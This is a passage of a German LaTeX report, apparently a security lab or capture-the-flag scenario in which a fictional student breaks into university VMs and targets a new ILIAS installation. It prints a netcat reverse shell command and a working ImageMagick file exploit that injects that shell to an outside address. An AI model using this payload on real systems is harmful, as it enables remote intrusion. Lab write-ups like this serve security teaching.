...
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    ...
    \label{subsec:vm2}
    TimDerHackerboy in sicher erfolgreich durch die \ac{vm}1 gekämpft und seine Note geändert.
    Seine Spuren hat er erfolgreich verwischt und sogar Credentials für eine neue ILIAS Version gefunden, die durch Administratoren der Hochschule gerade aufgesetzt wird.
    ...
    Tim wäre kein Hackerboy würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
    So könnte er Professor SuperSicherAndi beweisen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.
    ...
    Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc 192.168.100.113 4444 –e /bin/bash}.
    Der in~\ref{lst:imageMagickExploit} beschriebene Exploit kann um die Netcat Reverse Shell ergänzt werden um den fertigen Exploit zu erhalten.

    \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
        #In von ImageMagick akzeptiertem Dateiformat speichern
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://example.com/image.jpg"|nc 10.39.0.127 4444 "-e/bin/bash '
        pop graphic-context
    \end{lstlisting}

    \subsubsection{Verbindung mittels Reverse Shell herstellen}
